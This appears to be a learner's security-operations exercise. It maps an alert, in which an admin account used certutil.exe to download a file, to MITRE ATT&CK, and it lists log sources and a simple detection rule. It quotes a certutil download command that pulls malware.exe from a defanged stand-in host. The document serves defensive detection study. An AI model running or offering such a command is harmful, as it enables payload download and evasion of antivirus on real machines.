## TASK 3: MITRE ATT&CK Mapping – Certutil File Download

# Alert Description
User Finance_Admin used certutil.exe to download a file from "hxxp://badsite.xyz/malware.exe"

• Example Command:
certutil.exe -urlcache -split -f "hxxp://badsite.xyz/malware.exe"

## My first Thought 
certutil.exe is a legitimate Microsoft Windows utility, but attackers often abuse it as a Living-off-the-Land (LoLBin) tool to:
- Download malicious payloads
- Evade antivirus and EDR detection
- Blend in with normal system activity
seeing an Admin using certutil.exe to download from external url is suspicious.

## MITRE ATT&CK Mapping
• Tactic:
Command and Control
ID: TA0011

• Technique:
Ingress Tool Transfer
ID: T1105

• Procedure Example:
Certutil.exe (Living-off-the-Land Binary)
ID: S0160

• Log Sources
Windows Security Log
Event ID 4688 – Process Creation
Sysmon
Event ID 1 – Process Creation

• Detection Rule (Simple)
Alert when certutil.exe is executed from a command line or powershell

Analyst should focus on non_Administrative accessing certutil or certutil.exe is accessing the network

## Why This Matters
This activity may indicate:
Malware download
Payload staging
Command-and-control setup
